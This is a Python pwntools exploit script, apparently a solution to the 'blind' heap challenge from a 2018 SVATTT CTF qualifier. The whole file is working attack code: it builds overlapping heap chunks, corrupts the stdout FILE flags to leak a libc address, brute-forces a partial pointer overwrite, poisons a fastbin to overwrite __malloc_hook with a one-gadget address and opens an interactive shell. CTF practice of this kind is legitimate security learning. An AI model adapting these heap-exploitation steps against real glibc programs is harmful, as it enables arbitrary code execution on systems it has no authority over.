#!/usr/bin/env python
from pwn import *
import sys

HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def new(idx,size):
	p.sendlineafter('Your choice: ','1')
	p.sendlineafter('scoreboard:',str(size))
	p.sendline(str(idx))

def mod(idx,cont):
	p.sendlineafter('Your choice: ','2')
	p.sendlineafter('scoreboard :',str(idx))
	p.send(cont)

def dele(idx):
	p.sendlineafter('Your choice: ','3')
	p.sendlineafter(':',str(idx))

def exploit(p):
	new(0,0x68) # 0
	new(1,0x200) # 1
	new(2,0x68)
	mod(0,'a'*0x60+p64(0)+'\x71')
	mod(2,p64(0x0)*(0x50/8)+p64(0)+p64(0x11))
	dele(1)
	dele(2)
	new(3,0x200+8)
	mod(3,'c'*0x200+p64(0x208)+'\x71')
	mod(2,a)
	new(4,0x68)
	new(5,0x68)
	
	flag=(0x00000000fbad2887&~8)|0x800|0x1000
	
	mod(5,'d'*0x33+p64(flag)+p64(0)*3+chr(0))
	l=p.recvuntil('\x7f')
	te=l[-6:]
	info("leak is 0x%x"%u64(te.ljust(8,'\x00')))
	base=u64(te.ljust(8,'\x00'))-0x3c5600  # lay so nay tu debug, 
							# lay ket qua tru cho vmmap libc
	info("base is 0x%x"%base)
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
	malloc=base+libc.symbols['__malloc_hook']
	info("malloc at 0x%x"%malloc)

	new(6,0x68)

	dele(6)
	mod(6,p64(malloc-0x23))
	new(7,0x68)
	new(8,0x68)
	off=base+0xf1147
	info("one at 0x%x"%off)
	mod(8,'a'*0x13+p64(off))
	new(9,10)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		for i in range(0,0x10000,0x1000):
			try:
				p=process('/home/khongtrang/share/2018/svattt18/quals/pwn/blind')
				print util.proc.pidof(p)
				so=i+0x620
				addr=so-0x43
				a=hex(addr)[2:].decode('hex')[::-1]
				exploit(p)
			except:
				pass
		
	else:
		p=process('/home/khongtrang/share/2018/svattt18/quals/pwn/blind')
		print util.proc.pidof(p)
		pause()
		a='\xdd\x25'
		exploit(p)
